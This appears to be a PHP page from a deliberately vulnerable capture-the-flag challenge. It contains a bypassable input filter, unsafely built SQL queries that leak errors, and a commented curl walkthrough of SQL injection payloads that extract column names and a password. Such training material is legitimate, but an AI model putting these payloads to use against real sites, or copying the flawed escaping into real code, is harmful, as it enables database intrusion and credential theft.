<?php
include("settings.php");
include("header.html");

?>
	<h1>Profile</h1>
<?php

function anti_sqli_filter($input) {
	$result = $input;
	$result = str_replace('\'', '\\\'', $result); // filter with replacement, i.e. escaping. User will have to avoid single quotes
	$result = str_replace(' ', '', $result); // Filter 'space'. Bypass with ASCII chars %09 (tab), %0a (new line), %0b, %0c or %a0.
	return $result;


	//$result = str_replace('\n', '', $result);
	//$result = str_replace('\r', '', $result);
	//$result = str_replace('"', '', $result);
	//$result = str_ireplace('UNION', '[->BLACKLIST_HIT<-]', $result);
	//$result = str_ireplace('GROUP', '[->BLACKLIST_HIT<-]', $result);
	//$result = str_ireplace('OR', '[->BLACKLIST_HIT<-]', $result); // will include infORmation_schema so they cannot read table info from there
	//$result = str_ireplace('FILE', '[->BLACKLIST_HIT<-]', $result);
	//$result = str_ireplace('/*', '[->BLACKLIST_HIT<-]', $result);
	//$result = str_ireplace('INFORMATION_SCHEMA', '[->BLACKLIST_HIT<-]', $result);
}

/*

Inspiration: http://kitctf.de/writeups/31c3-ctf/devilish/

1. Find it
curl "[site]/profiles/42%5c/antonio"
2. Find out number of columns
curl "[site]/profiles/42%5c/%20union%09select%091,2,3,4--%09-"
3. Get column names
curl "[site]/profiles/42%5c/%09and%09extractvalue(rand(),concat(0x3a,(select%09column_name%09from%09information_schema.columns%09limit%09486,1),0x3a))--%09-"
4. Get password from target column
curl "[site]/profiles/42%5c/or%09polygon((select(1)from(select(us3rn4m3),(PassW0rdColuMn)from(users)where(id=42))x))--%09-"

*/

if( isset($_GET['id']) ) {

	$id = anti_sqli_filter($_GET['id']); // bad escaping
	$username = anti_sqli_filter($_GET['username']); // bad escaping

	$sql = "SELECT * FROM users WHERE id='$id' AND us3rn4m3='$username'";
	$result = mysqli_query($conn, $sql);
	if (!$result) {
		echo "<!--" . $sql . "-->\n"; // clue about existing table 'users'
		echo mysqli_error($conn);
	}

	$row = $result->fetch_assoc();

	if (!$row) {
		?>
		<div>There isn't a user with that ID</div>
		<?php
	}
	else {
		$id = mysqli_real_escape_string($conn, $_GET['id']); // good escaping

		$sql = "SELECT * from profiles where userid='$id'";
		$result = mysqli_query($conn, $sql);
		$row = $result->fetch_assoc();

		$profile = $row['profile'];
		$id = $row['userid'];

		?>
			<p>ID <?php echo($id);?>: <?php echo($profile);?></p>
		<?php
	}
} else {
?>
	<h2>What are you doing here?</h2>

<?php
}
?>

<?php
include("footer.html");
?>
